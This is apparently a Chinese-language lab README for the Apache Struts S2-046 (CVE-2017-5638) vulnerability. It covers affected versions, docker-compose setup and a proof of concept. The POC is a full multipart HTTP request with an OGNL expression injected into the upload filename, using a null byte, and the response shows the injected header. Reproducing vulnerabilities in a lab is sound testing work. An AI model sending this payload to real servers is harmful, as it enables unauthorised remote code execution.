##  S2-046（CVE-2017-5638）
https://cwiki.apache.org/confluence/display/WW/S2-046

受影响：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
Jakarta Multipart解析器存在安全漏洞，该漏洞源于程序没有正确处理文件上传。攻击者可以通过构造HTTP请求头中的Content-Type值可能造成远程任意代码执行，S2-046与S2-045漏洞属于同一类型

## 测试环境搭建
```
docker-compose build
docker-compose up -d
```


## POC
```
 /bin/sh b.sh a a a

 脚本测试
 修改url=http://10.160.11.191:8080/fileupload/doUpload.action

```

```
POST /fileupload/doUpload.action HTTP/1.1
Host: 10.160.11.191:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Proxy-Connection: keep-alive
Cookie: JSESSIONID=AE03668DB7C99F9A53F1AAB6EEDB516D
Content-Type: multipart/form-data; boundary=---------------------------146043902153
Content-Length: 393

-----------------------------146043902153
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}注意这里是一个16进制的\x00b,使用burpsuite hex编辑插入byte和字符\b"

Content-Type: application/octet-stream

555
-----------------------------146043902153
Content-Disposition: form-data; name="caption"

ah
-----------------------------146043902153--
```
HTTP/1.1 200 
X-Test: Kaboom (响应头被插入)
Set-Cookie: JSESSIONID=3037034F2B3566F019F56B200F4EAA37; Path=/; HttpOnly
Content-Type: text/html;charset=ISO-8859-1
Date: Wed, 11 Oct 2017 10:11:43 GMT
Content-Length: 10823

## 参考：

* (https://thief.one/2017/03/21/Struts2-046%E6%BC%8F%E6%B4%9E/)




